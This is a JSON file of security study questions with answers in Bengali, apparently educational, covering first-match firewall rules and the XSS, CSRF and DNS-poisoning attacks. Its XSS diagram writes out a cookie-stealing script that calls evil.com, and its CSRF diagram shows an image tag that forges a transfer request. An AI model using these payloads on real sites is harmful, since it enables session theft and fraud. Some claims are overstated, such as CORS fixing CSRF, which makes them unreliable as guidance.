@@ -1,0 +1,61 @@
+{
+  "category": "information_security",
+  "questions": [
+    {
+      "id": "sec_001",
+      "q": "Firewall rules - Rule 1: Source A, Dest B, Port 89. Rule 2: Source A, Dest B, Port < 443. Rule 3: Source A, Dest B, Port 443. If a packet comes from Port 443, is it accepted or rejected? Explain 'First Inspection rules'.",
+      "tags": ["firewall", "first match", "packet filtering", "rules"],
+      "answer": {
+        "summary": "Port 443 packet টি Rule 1 ও Rule 2 এর সাথে match করে না — Rule 3 এ গিয়ে match হয় এবং packet ACCEPTED হয়। এটাই First Match (First Inspection) নীতি।",
+        "points": [
+          "First Inspection Rule = Firewall rules গুলো উপর থেকে নিচে ক্রমানুসারে check করা হয়",
+          "প্রথম যে rule টি packet এর সাথে match করে, সেটিই apply হয় — বাকি rules দেখা হয় না",
+          "Rule 1: Port 89 → 443 ≠ 89 → No Match",
+          "Rule 2: Port < 443 → 443 < 443 = false → No Match",
+          "Rule 3: Port 443 → 443 = 443 → MATCH → ACCEPTED ✅",
+          "কোনো rule না মিললে Default Policy প্রযোজ্য হয় — সাধারণত DENY ALL"
+        ],
+        "diagram": " Packet: Source=A, Dest=B, Port=443\n          │\n          ▼\n ┌─────────────────────────────────┐\n │ Rule 1: Src=A, Dst=B, Port=89  │\n │ 443 == 89?  → ❌ NO MATCH      │\n └────────────────┬────────────────┘\n                  │ next rule\n                  ▼\n ┌─────────────────────────────────┐\n │ Rule 2: Src=A, Dst=B, Port<443 │\n │ 443 < 443? → ❌ NO MATCH       │\n └────────────────┬────────────────┘\n                  │ next rule\n                  ▼\n ┌─────────────────────────────────┐\n │ Rule 3: Src=A, Dst=B, Port=443 │\n │ 443 == 443? → ✅ MATCH!        │\n │         PACKET ACCEPTED         │\n └─────────────────────────────────┘\n          (Rule 3 এর পর আর দেখা হয় না)\n\n DEFAULT POLICY (কোনো rule না মিললে):\n Rule 1 → No Match\n Rule 2 → No Match  →  DENY ALL ❌\n Rule 3 → No Match",
+        "mistakes": [
+          ["Firewall সব rules চেক করে best match নেয়", "না — প্রথম match এই থামে, best match খোঁজে না"],
+          ["Port < 443 মানে Port 443 ও block হবে", "না — 443 < 443 mathematically false, তাই Rule 2 apply হয়নি"]
+        ],
+        "mnemonic": "Firewall = লাইনে দাঁড়ানো security guard — প্রথম guard যে ছেড়ে দেয় বা আটকায়, সেটাই চূড়ান্ত। বাকি guards এর কাছে যাওয়াই হয় না।"
+      }
+    },
+    {
+      "id": "sec_002",
+      "q": "What are XSS (Cross-Site Scripting), CSRF (Cross-Site Request Forgery), and DNS Poisoning — especially in relation to session cookies? What are the differences between them? How are they handled/mitigated today using CORS and SameSite?",
+      "tags": ["XSS", "CSRF", "DNS poisoning", "session cookie", "CORS", "SameSite", "HTTPOnly", "web security"],
+      "answer": {
+        "summary": "তিনটিই session cookie কে target করে কিন্তু ভিন্নভাবে — XSS cookie চুরি করে, CSRF cookie ব্যবহার করে না চুরি করে, DNS Poisoning victim কে ভুল সার্ভারে পাঠায়। আধুনিক সমাধান: HTTPOnly, SameSite, CORS, DNSSEC।",
+        "points": [
+          "XSS: Attacker trusted website এ malicious JS inject করে → script victim এর browser এ run করে → document.cookie চুরি করে attacker এর server এ পাঠায়",
+          "CSRF: Cookie চুরি করে না — victim এর browser কে দিয়ে bank.com এ unwanted request করায়। Browser automatically victim এর cookie পাঠায় → blind attack",
+          "DNS Poisoning: DNS cache এ ভুল IP inject করে → bank.com টাইপ করলে victim attacker এর fake server এ যায় → credentials ও session চুরি হয়",
+          "HTTPOnly flag: JavaScript দিয়ে cookie access বন্ধ → XSS এর cookie theft ঠেকায়",
+          "SameSite=Strict: Cookie শুধু same-site request এ যায় → CSRF সম্পূর্ণ ঠেকায়",
+          "CORS: cross-origin response reading block করে → evil.com bank.com/api এর response পড়তে পারে না",
+          "DNSSEC: DNS records cryptographically sign করে → poisoned record verify হয় না → block হয়"
+        ],
+        "diagram": "XSS FLOW:\n Attacker injects: <script>fetch('evil.com/?c='+document.cookie)</script>\n → stored in bank.com DB\n Victim visits bank.com → script runs → cookie sent to evil.com\n Attacker logs in AS victim ✅\n\nCSRF FLOW:\n Victim logged into bank.com (cookie: session=abc)\n Attacker sends: <img src='bank.com/transfer?to=hacker&amt=50000'>\n Browser auto-sends: GET bank.com/... + Cookie: session=abc\n bank.com thinks victim requested it → transfer done ❌\n Attacker never saw the cookie — used it blindly\n\nDNS POISONING FLOW:\n Normal:   bank.com → DNS → 192.168.1.1 (real bank) ✅\n Poisoned: bank.com → DNS → 10.0.0.99 (fake bank) ❌\n Victim types bank.com → lands on attacker's server\n Logs in → credentials + session cookie stolen\n\nMODERN DEFENSES:\n Set-Cookie: session=abc; HttpOnly    ← JS cannot read cookie (XSS fix)\n Set-Cookie: session=abc; SameSite=Strict ← no cross-site sending (CSRF fix)\n Access-Control-Allow-Origin: bank.com   ← CORS blocks evil.com reading (CSRF fix)\n DNSSEC: cryptographic signature on DNS  ← poisoned records rejected",
+        "mistakes": [
+          ["HTTPOnly দিলে CSRF থেকে রক্ষা পাওয়া যায়", "না — CSRF cookie দেখে না, শুধু browser পাঠায়। SameSite দরকার"],
+          ["CORS সব attack থেকে রক্ষা করে", "না — CORS শুধু cross-origin response reading block করে। XSS এ কাজ করে না"],
+          ["HTTPS দিলে DNS Poisoning থামে", "আংশিক — certificate mismatch সতর্ক করে, কিন্তু DNSSEC ছাড়া DNS layer সুরক্ষিত নয়"]
+        ],
+        "table": {
+          "headers": ["", "XSS", "CSRF", "DNS Poisoning"],
+          "rows": [
+            ["Cookie relation", "JS দিয়ে চুরি করে", "Browser দিয়ে ব্যবহার করে", "Fake site এ নিয়ে যায়"],
+            ["Attack layer", "Browser (JS)", "Browser (HTTP)", "Network (DNS)"],
+            ["Cookie দেখে?", "✅ হ্যাঁ", "❌ না (blind)", "✅ নতুন cookie নেয়"],
+            ["Script লাগে?", "✅ হ্যাঁ", "❌ না", "❌ না"],
+            ["Primary fix", "HTTPOnly + CSP", "SameSite + CSRF token", "DNSSEC + HTTPS"]
+          ]
+        },
+        "mnemonic": "XSS = eXtra Script Steals cookie → HTTPOnly দিয়ে ঠেকাও। CSRF = Cookie Rides on your Fake request → SameSite দিয়ে ঠেকাও। DNS Poisoning = Wrong Door, Not your Server → DNSSEC + HTTPS দিয়ে ঠেকাও।"
+      }
+    }
+  ]
+}
